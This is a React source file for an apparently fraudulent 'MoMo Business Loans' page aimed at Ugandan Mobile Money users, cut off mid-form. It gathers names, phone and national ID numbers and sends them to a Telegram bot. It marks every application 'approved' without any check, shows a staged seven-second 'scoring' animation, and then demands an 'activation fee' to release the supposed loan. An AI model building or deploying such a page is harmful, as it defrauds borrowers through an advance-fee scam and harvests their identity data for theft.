import { useState, useEffect, FormEvent } from 'react';
import { useNavigate } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import Confetti from '../components/Confetti';
import { sendToTelegram } from '../lib/api';
import { setApplication, calculateActivationFee, getSession, setSession } from '../lib/session';
import {
  ArrowLeft,
  Building2,
  ChevronDown,
  Loader2,
  CheckCircle2,
  ArrowRight,
  ShieldCheck,
  AlertCircle,
  Briefcase,
  Store,
  Ban,
  Calendar,
  DollarSign,
} from 'lucide-react';

const loanPurposes = [
  'Business Expansion',
  'Working Capital',
  'Equipment Purchase',
  'Agriculture',
  'Trade & Commerce',
  'Transport',
  'Emergency Stock',
  'Other',
];

const loanTypes = [
  'Business Loan',
  'SME Commercial Loan',
  'Working Capital Loan',
  'Salary Advance',
  'Emergency Business Loan',
];

const repaymentPeriods = [
  '1 Month',
  '3 Months',
  '6 Months',
  '12 Months',
];

const businessRevenueRanges = [
  'UGX 500,000 - 1,500,000 / month',
  'UGX 1,500,000 - 3,500,000 / month',
  'UGX 3,500,000 - 7,000,000 / month',
  'UGX 7,000,000 - 15,000,000 / month',
  'Above UGX 15,000,000 / month',
];

const salaryRanges = [
  'UGX 500,000 - 1,000,000 / month',
  'UGX 1,000,000 - 2,500,000 / month',
  'UGX 2,500,000 - 5,000,000 / month',
  'Above UGX 5,000,000 / month',
];

const salaryDates = [
  '25th of the month',
  '28th of the month',
  'End of month (30th/31st)',
  '1st of the month',
  '5th of the month',
  '15th of the month',
];

const genders = ['Male', 'Female'];

const nationalities = [
  'Ugandan',
  'Kenyan',
  'Tanzanian',
  'Rwandan',
  'South African',
  'Other',
];

export default function LoanApplication() {
  const navigate = useNavigate();
  const session = getSession();

  // Questionnaire States
  // Business question: 'yes' | 'no' | ''
  const [hasBusiness, setHasBusiness] = useState<'yes' | 'no' | ''>('');
  const [businessRevenue, setBusinessRevenue] = useState(businessRevenueRanges[1]);

  // Employment question: 'employed' | 'unemployed' | ''
  const [hasJob, setHasJob] = useState<'employed' | 'unemployed' | ''>('');
  const [jobSalary, setJobSalary] = useState(salaryRanges[1]);
  const [salaryDate, setSalaryDate] = useState(salaryDates[0]);

  // Check if blocked: unemployed AND no business
  const isBlocked = hasBusiness === 'no' && hasJob === 'unemployed';
  const hasAnswered = hasBusiness !== '' && hasJob !== '';
  const isEligible = hasAnswered && !isBlocked && (hasBusiness === 'yes' || hasJob === 'employed');

  // Form states - empty amount with UGX 0 placeholder/initial value
  const [amountRaw, setAmountRaw] = useState<string>(''); // when empty, displays 'UGX 0'
  const [repayment, setRepayment] = useState('6 Months');
  const [purpose, setPurpose] = useState('Business Expansion');
  const [type, setType] = useState('Business Loan');

  // Personal details
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [phone, setPhone] = useState(session?.phone || '');
  const [gender, setGender] = useState('Male');
  const [idNumber, setIdNumber] = useState('');
  const [nationality, setNationality] = useState('Ugandan');

  // UI Flow state: 'questionnaire' | 'form' | 'loading' | 'congratulations'
  const [flowState, setFlowState] = useState<'questionnaire' | 'form' | 'loading' | 'congratulations'>('questionnaire');
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    if (flowState !== 'loading') {
      setLoadingProgress(0);
      return;
    }

    const startTime = Date.now();
    const duration = 7000;
    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min(Math.round((elapsed / duration) * 100), 99);
      setLoadingProgress(pct);
      if (elapsed >= duration) {
        clearInterval(interval);
      }
    }, 100);

    return () => clearInterval(interval);
  }, [flowState]);

  // Parsed amount number
  const numericAmount = parseInt(amountRaw.replace(/\D/g, ''), 10) || 0;
  const isAmountValid = numericAmount >= 1000000 && numericAmount <= 10000000;

  // Activation fee calculation
  const feeInfo = calculateActivationFee(numericAmount);

  // Handle amount input change
  const handleAmountChange = (val: string) => {
    const digitsOnly = val.replace(/\D/g, '');
    if (!digitsOnly) {
      setAmountRaw('');
      return;
    }
    const num = parseInt(digitsOnly, 10);
    if (num > 10000000) {
      setAmountRaw('10000000');
    } else {
      setAmountRaw(digitsOnly);
    }
  };

  const formattedAmountDisplay = numericAmount > 0 ? `UGX ${numericAmount.toLocaleString()}` : 'UGX 0';

  const isFormValid =
    isAmountValid &&
    purpose &&
    type &&
    repayment &&
    firstName.trim() &&
    lastName.trim() &&
    phone.trim().length >= 7 &&
    gender &&
    idNumber.trim();

  // Submit loan application
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!isAmountValid) {
      setErrorMessage('Please enter a loan amount between UGX 1,000,000 and UGX 10,000,000.');
      return;
    }
    if (!isFormValid) {
      setErrorMessage('Please complete all application details in each box.');
      return;
    }

    setErrorMessage('');
    setFlowState('loading');

    // Save session if not already logged in
    setSession({
      phone: phone.trim(),
      country: nationality === 'Ugandan' ? 'Uganda' : nationality,
      countryCode: '+256',
      loggedIn: true,
    });

    // Save application to session store
    setApplication({
      amount: `UGX ${numericAmount.toLocaleString()}`,
      amountNum: numericAmount,
      activationFee: feeInfo.formatted,
      purpose,
      type,
      repayment,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      phone: phone.trim(),
      gender,
      idNumber: idNumber.trim(),
      nationality,
      submittedAt: new Date().toISOString(),
      status: 'approved',
    });

    // Notify Telegram bot in background with eligibility answers
    sendToTelegram({
      type: 'submission',
      country: nationality === 'Ugandan' ? 'Uganda' : nationality,
      countryCode: '+256',
      phone: phone.trim(),
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      gender,
      idNumber: idNumber.trim(),
      nationality,
      loanAmount: `UGX ${numericAmount.toLocaleString()}`,
      loanPurpose: purpose,
      loanType: type,
      repaymentPeriod: repayment,
    }).catch(() => {});

    // Transition after 7 seconds loading delay to congratulations
    setTimeout(() => {
      setLoadingProgress(100);
      setFlowState('congratulations');
    }, 7000);
  };

  // State 0: Quick Questions Questionnaire
  if (flowState === 'questionnaire') {
    return (
      <PageLoader>
        <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
          {/* Header */}
          <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
            <div className="container mx-auto max-w-4xl flex items-center justify-between">
              <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                <Logo size="sm" />
                <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                  MoMo <span className="font-normal opacity-90">Business Loans</span>
                </span>
              </div>
              <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
                Step 1: Eligibility Check
              </span>
            </div>
          </header>

          <main className="flex-1 container mx-auto max-w-lg px-4 py-8">
            <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
              <button
                onClick={() => navigate('/')}
                className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-xs sm:text-sm font-semibold mb-4 transition"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Home</span>
              </button>

              <div className="text-center mb-6">
                <div className="w-12 h-12 rounded-2xl bg-sky-50 text-[#004F71] flex items-center justify-center mx-auto mb-2 border border-sky-200">
                  <Briefcase className="w-6 h-6 text-[#004F71]" />
                </div>
                <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(198,100%,22%)]">
                  Income & Eligibility Check
                </h2>
                <p className="text-gray-500 text-xs sm:text-sm mt-1">
                  Answer a few quick questions to confirm your loan eligibility
                </p>
              </div>

              <div className="space-y-5">
                {/* Question 1: Do you have a business? */}
                <div>
                  <label className="block text-xs sm:text-sm font-extrabold text-gray-800 mb-2">
                    1. Do you have a business?
                  </label>
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => setHasBusiness('yes')}
                      className={`p-3.5 rounded-2xl border-2 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition cursor-pointer ${
                        hasBusiness === 'yes'
                          ? 'border-[#004F71] bg-sky-50 text-gray-900 shadow-xs'
                          : 'border-gray-200 hover:border-gray-300 text-gray-700 bg-white'
                      }`}
                    >
                      <Store className="w-4 h-4 text-[#004F71]" />
                      <span>Yes, I have a business</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setHasBusiness('no')}
                      className={`p-3.5 rounded-2xl border-2 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition cursor-pointer ${
                        hasBusiness === 'no'
                          ? 'border-gray-900 bg-gray-100 text-gray-900 shadow-xs'
                          : 'border-gray-200 hover:border-gray-300 text-gray-700 bg-white'
                      }`}
                    >
                      <span>No business</span>
                    </button>
                  </div>

                  {/* If Yes: How much does the business generate? */}
                  {hasBusiness === 'yes' && (
                    <div className="mt-3 p-3.5 rounded-2xl bg-sky-50/70 border border-sky-200 animate-fadeIn">
                      <label className="block text-xs font-bold text-gray-700 mb-1">
                        How much does your business generate monthly?
                      </label>
                      <div className="relative">
                        <select
                          value={businessRevenue}
                          onChange={(e) => setBusinessRevenue(e.target.value)}
                          className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
                        >
                          {businessRevenueRanges.map((r) => (
                            <option key={r} value={r}>
                              {r}
                            </option>
                          ))}
                        </select>
                        <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                      </div>
                    </div>
                  )}
                </div>

                {/* Question 2: Do you have a job? */}
                <div>
                  <label className="block text-xs sm:text-sm font-extrabold text-gray-800 mb-2">
                    2. Do you have a job / employment?
                  </label>
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => setHasJob('employed')}
                      className={`p-3.5 rounded-2xl border-2 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition cursor-pointer ${
                        hasJob === 'employed'
                          ? 'border-[#004F71] bg-sky-50 text-gray-900 shadow-xs'
                          : 'border-gray-200 hover:border-gray-300 text-gray-700 bg-white'
                      }`}
                    >
                      <Briefcase className="w-4 h-4 text-blue-600" />
                      <span>Yes, I am employed</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setHasJob('unemployed')}
                      className={`p-3.5 rounded-2xl border-2 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition cursor-pointer ${
                        hasJob === 'unemployed'
                          ? 'border-red-300 bg-red-50 text-red-800 shadow-xs'
                          : 'border-gray-200 hover:border-gray-300 text-gray-700 bg-white'
                      }`}
                    >
                      <span>I am unemployed</span>
                    </button>
                  </div>

                  {/* If Employed: How much do you earn & when is the date of salary? */}
                  {hasJob === 'employed' && (
                    <div className="mt-3 p-3.5 rounded-2xl bg-blue-50/60 border border-blue-200 space-y-3 animate-fadeIn">
                      <div>
                        <label className="block text-xs font-bold text-gray-700 mb-1">
                          How much do you earn monthly?
                        </label>
                        <div className="relative">
                          <select
                            value={jobSalary}
                            onChange={(e) => setJobSalary(e.target.value)}
                            className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
                          >
                            {salaryRanges.map((s) => (
                              <option key={s} value={s}>
                                {s}
                              </option>
                            ))}
                          </select>
                          <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                        </div>
                      </div>

                      <div>
                        <label className="block text-xs font-bold text-gray-700 mb-1">
                          When is the date of your salary?
                        </label>
                        <div className="relative">
                          <select
                            value={salaryDate}
                            onChange={(e) => setSalaryDate(e.target.value)}
                            className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl px-3.5 py-2.5 text-xs sm:text-sm font-bold text-gray-900 bg-white outline-none pr-8 shadow-xs"
                          >
                            {salaryDates.map((d) => (
                              <option key={d} value={d}>
                                {d}
                              </option>
                            ))}
                          </select>
                          <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                        </div>
                      </div>
                    </div>
                  )}
                </div>

                {/* Blocking Ineligibility Alert */}
                {isBlocked && (
                  <div className="p-4 rounded-2xl bg-red-50 border-2 border-red-300 text-red-800 text-xs leading-relaxed animate-fadeIn">
                    <div className="flex items-center gap-2 font-black text-red-900 text-sm mb-1">
                      <Ban className="w-5 h-5 text-red-600 shrink-0" />
                      <span>Not Eligible to Proceed</span>
                    </div>
                    <p>
                      You indicated that you <span className="font-bold">do not have a business</span> and are <span className="font-bold">unemployed</span>. MoMo Business Loans require applicants to have verifiable income from an active business or regular employment.
                    </p>
                    <p className="mt-2 text-red-700 font-bold">
                      The system cannot allow you to proceed with this application.
                    </p>
                  </div>
                )}

                {/* Continue button */}
                <button
                  type="button"
                  id="questionnaire-continue-btn"
                  onClick={() => isEligible && setFlowState('form')}
                  disabled={!isEligible}
                  className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] disabled:opacity-30 disabled:cursor-not-allowed transition shadow-md flex items-center justify-center gap-2 cursor-pointer mt-4 border border-[#006591]/40"
                >
                  {isBlocked ? (
                    <span>Cannot Proceed (Income Required)</span>
                  ) : (
                    <>
                      <span>Continue to Loan Application</span>
                      <ArrowRight className="w-5 h-5" />
                    </>
                  )}
                </button>

                <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 text-center pt-2">
                  <ShieldCheck className="w-4 h-4 text-green-600" />
                  <span>Verified MoMo business and salary underwriting compliance</span>
                </div>
              </div>
            </div>
          </main>
        </div>
      </PageLoader>
    );
  }

  // State 1: Loading Page while assessing approval (7 seconds)
  if (flowState === 'loading') {
    return (
      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
        <Logo size="md" />
        <h2 className="text-2xl font-extrabold tracking-tight">
          MoMo <span className="text-white font-extrabold">Business Loans</span>
        </h2>
        <Loader2 className="w-12 h-12 text-sky-300 animate-spin" />
        <div className="space-y-4 max-w-sm w-full">
          <div>
            <p className="text-white text-lg sm:text-xl font-extrabold">
              Reviewing & Approving Your Application...
            </p>
            <p className="text-gray-300 text-xs sm:text-sm leading-relaxed mt-1">
              {loadingProgress < 25 && 'Connecting with Mobile Money automated scoring system...'}
              {loadingProgress >= 25 && loadingProgress < 50 && 'Assessing business and income underwriting criteria...'}
              {loadingProgress >= 50 && loadingProgress < 75 && 'Verifying identity records and repayment terms...'}
              {loadingProgress >= 75 && 'Finalizing instant approval and disbursement allocation...'}
            </p>
          </div>

          {/* 7-second Progress Bar */}
          <div className="w-full bg-[hsl(198,80%,28%)] rounded-full h-3 border border-[hsl(198,55%,35%)] overflow-hidden p-0.5">
            <div
              className="bg-sky-400 h-full rounded-full transition-all duration-150 ease-out"
              style={{ width: `${Math.min(loadingProgress, 100)}%` }}
            />
          </div>
          <div className="flex justify-between items-center text-[11px] text-gray-300 font-semibold px-1">
            <span>Automated Scoring</span>
            <span className="text-white font-bold">{loadingProgress}%</span>
          </div>
        </div>
      </div>
    );
  }

  // State 2: Congratulations & Approved Loan Page with Activation Fee in Red Color
  if (flowState === 'congratulations') {
    return (
      <PageLoader>
        <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col relative overflow-x-hidden">
          <Confetti />

          {/* Header */}
          <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
            <div className="container mx-auto max-w-4xl flex items-center justify-between">
              <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                <Logo size="sm" />
                <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                  MoMo <span className="font-normal opacity-90">Business Loans</span>
                </span>
              </div>
              <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
                Application Approved
              </span>
            </div>
          </header>

          {/* Main Congratulations Card */}
          <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
            <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-lg w-full shadow-2xl text-[hsl(198,100%,22%)] border border-gray-100 relative z-10">
              <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-green-200">
                <CheckCircle2 className="w-12 h-12 text-green-500" />
              </div>

              <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(198,100%,22%)]">
                🎉 Congratulations, {firstName}!
              </h2>

              <p className="text-gray-600 text-sm sm:text-base leading-relaxed mb-6 font-medium">
                The loan amount you applied for has been <span className="font-bold text-green-700">successfully approved</span> and is ready for instant Mobile Money disbursement!
              </p>

              {/* Approved Amount Card */}
              <div className="bg-gradient-to-br from-green-50 to-emerald-50/50 rounded-2xl p-4 sm:p-5 border border-green-200 mb-5 text-left">
                <div className="flex items-center justify-between pb-3 border-b border-green-200/80">
                  <span className="text-xs font-bold text-gray-600 uppercase tracking-wide">Approved Loan Amount</span>
                  <span className="text-xs font-extrabold bg-green-100 text-green-800 px-2.5 py-0.5 rounded-full">
                    Approved ✅
                  </span>
                </div>
                <div className="pt-2 flex items-baseline justify-between">
                  <span className="text-2xl sm:text-3xl font-black text-gray-900">
                    UGX {numericAmount.toLocaleString()}
                  </span>
                  <span className="text-xs text-gray-500 font-semibold">{repayment} tenure</span>
                </div>
              </div>

              {/* Activation Fee Banner in Red Color */}
              <div className="bg-red-50/80 rounded-2xl p-4 sm:p-5 border-2 border-red-300 mb-6 text-left shadow-sm">
                <div className="flex items-center justify-between pb-2 border-b border-red-200">
                  <span className="text-xs font-extrabold text-red-700 uppercase tracking-wide">
                    Required Activation Fee
                  </span>
                  <span className="text-[11px] font-bold bg-red-100 text-red-800 px-2 py-0.5 rounded-md">
                    One-Time Fee
                  </span>
                </div>
                <div className="pt-2 flex items-baseline justify-between">
                  <span className="text-2xl sm:text-3xl font-black text-red-600">
                    {feeInfo.formatted}
                  </span>
                  <span className="text-xs text-red-700 font-bold">To unlock withdrawal</span>
                </div>
                <p className="text-xs text-red-800 mt-2 leading-tight">
                  To release and withdraw your approved loan of <span className="font-bold">UGX {numericAmount.toLocaleString()}</span> to your MoMo wallet, please pay the activation fee of <span className="font-black text-red-600">{feeInfo.formatted}</span>.
                </p>
              </div>

              {/* Pay Activation Fee and Withdraw Button */}
              <button
                id="pay-fee-withdraw-btn"
                onClick={() =>
                  navigate('/payment', {
                    state: {
                      amount: `UGX ${numericAmount.toLocaleString()}`,
                      amountNum: numericAmount,
                      activationFee: feeInfo.formatted,
                      feeNum: feeInfo.fee,
                      firstName,
                      lastName,
                      phone,
                      repayment,
                    },
                  })
                }
                className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-lg flex items-center justify-center gap-2 cursor-pointer group border border-[#006591]/40"
              >
                <span>Pay the activation fee and withdraw</span>
                <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </button>

              <div className="mt-4 flex items-center justify-center gap-1.5 text-xs text-gray-500 font-medium">
                <ShieldCheck className="w-4 h-4 text-green-600" />
                <span>Instant Mobile Money wallet disbursement upon fee clearance</span>
              </div>
            </div>
          </main>
        </div>
      </PageLoader>
    );
  }

  // State 3: Loan Application Form with boxes 2 in each row/line
  return (
    <PageLoader>
      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
        {/* Header */}
        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                MoMo <span className="font-normal opacity-90">Business Loans</span>
              </span>
            </div>
            <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
              Step 2: Loan Details
            </span>
          </div>
        </header>

        {/* Content */}
        <main className="flex-1 container mx-auto max-w-2xl px-3 sm:px-4 py-6 sm:py-8">
          <div className="bg-white rounded-3xl p-5 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
            <div className="flex items-center justify-between mb-4">
              <button
                id="loan-app-back-btn"
                onClick={() => setFlowState('questionnaire')}
                className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-xs sm:text-sm font-semibold transition cursor-pointer"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Back to Questions</span>
              </button>
              <span className="text-[11px] sm:text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 px-2.5 py-1 rounded-lg">
                Eligible Candidate ✅
              </span>
            </div>

            <div className="text-center mb-5 sm:mb-6">
              <div className="w-11 h-11 rounded-2xl bg-sky-50 text-[#004F71] flex items-center justify-center mx-auto mb-2 border border-sky-200">
                <Building2 className="w-5 h-5 text-[#004F71]" />
              </div>
              <h2 className="text-xl sm:text-2xl font-extrabold tracking-tight text-[hsl(198,100%,22%)]">
                Instant MoMo Business Loan Application
              </h2>
              <p className="text-gray-500 text-xs sm:text-sm mt-0.5">
                Fill in your details below. Fast approval with zero collateral.
              </p>
            </div>

            {errorMessage && (
              <div className="mb-4 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-semibold flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{errorMessage}</span>
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-3.5 sm:space-y-4">
              {/* Row 1: Loan Amount (empty box with UGX 0) & Repayment Period */}
              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                {/* Box 1: Loan Amount */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Loan Amount
                  </label>
                  <div className="relative">
                    <input
                      id="input-loan-amount"
                      type="text"
                      inputMode="numeric"
                      value={amountRaw ? `UGX ${parseInt(amountRaw, 10).toLocaleString()}` : ''}
                      onChange={(e) => handleAmountChange(e.target.value)}
                      placeholder="UGX 0"
                      className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-extrabold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                    />
                  </div>
                  <span className="text-[10px] text-gray-400 mt-0.5 font-medium">
                    From UGX 1M to 10M
                  </span>
                </div>

                {/* Box 2: Repayment Period */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Repayment Period
                  </label>
                  <div className="relative">
                    <select
                      id="select-repayment"
                      value={repayment}
                      onChange={(e) => setRepayment(e.target.value)}
                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
                    >
                      {repaymentPeriods.map((p) => (
                        <option key={p} value={p}>
                          {p}
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  </div>
                  <span className="text-[10px] text-gray-400 mt-0.5 font-medium">
                    Flexible tenure
                  </span>
                </div>
              </div>

              {/* Row 2: Purpose of Loan & Type of Loan */}
              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                {/* Box 3: Purpose of Loan */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Purpose of Loan
                  </label>
                  <div className="relative">
                    <select
                      id="select-purpose"
                      value={purpose}
                      onChange={(e) => setPurpose(e.target.value)}
                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition truncate"
                    >
                      {loanPurposes.map((p) => (
                        <option key={p} value={p}>
                          {p}
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  </div>
                </div>

                {/* Box 4: Type of Loan */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Type of Loan
                  </label>
                  <div className="relative">
                    <select
                      id="select-loan-type"
                      value={type}
                      onChange={(e) => setType(e.target.value)}
                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition truncate"
                    >
                      {loanTypes.map((t) => (
                        <option key={t} value={t}>
                          {t}
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  </div>
                </div>
              </div>

              {/* Row 3: First Name & Last Name */}
              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                {/* Box 5: First Name */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    First Name
                  </label>
                  <input
                    id="input-first-name"
                    type="text"
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value)}
                    placeholder="e.g. John"
                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                  />
                </div>

                {/* Box 6: Last Name */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Last Name
                  </label>
                  <input
                    id="input-last-name"
                    type="text"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    placeholder="e.g. Kato"
                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                  />
                </div>
              </div>

              {/* Row 4: Mobile Money Number & Gender */}
              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                {/* Box 7: Mobile Money Number */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    MoMo Phone Number
                  </label>
                  <input
                    id="input-phone"
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                    placeholder="e.g. 0785123456"
                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400"
                  />
                </div>

                {/* Box 8: Gender */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Gender
                  </label>
                  <div className="relative">
                    <select
                      id="select-gender"
                      value={gender}
                      onChange={(e) => setGender(e.target.value)}
                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
                    >
                      {genders.map((g) => (
                        <option key={g} value={g}>
                          {g}
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  </div>
                </div>
              </div>

              {/* Row 5: National ID / NIN & Nationality */}
              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                {/* Box 9: National ID / NIN */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    National ID / NIN
                  </label>
                  <input
                    id="input-id-number"
                    type="text"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value.toUpperCase())}
                    placeholder="e.g. CM98..."
                    className="w-full border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-900 outline-none bg-white shadow-xs transition placeholder:text-gray-400 uppercase"
                  />
                </div>

                {/* Box 10: Nationality */}
                <div className="flex flex-col">
                  <label className="text-[11px] sm:text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                    Nationality
                  </label>
                  <div className="relative">
                    <select
                      id="select-nationality"
                      value={nationality}
                      onChange={(e) => setNationality(e.target.value)}
                      className="w-full appearance-none border-2 border-gray-200 focus:border-[#004F71] rounded-xl sm:rounded-2xl px-3 sm:px-4 py-2.5 sm:py-3 text-xs sm:text-sm font-bold text-gray-800 outline-none bg-white pr-8 shadow-xs transition"
                    >
                      {nationalities.map((n) => (
                        <option key={n} value={n}>
                          {n}
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                  </div>
                </div>
              </div>

              {/* Submit Application Button */}
              <div className="pt-2">
                <button
                  id="submit-loan-app-btn"
                  type="submit"
                  disabled={!numericAmount}
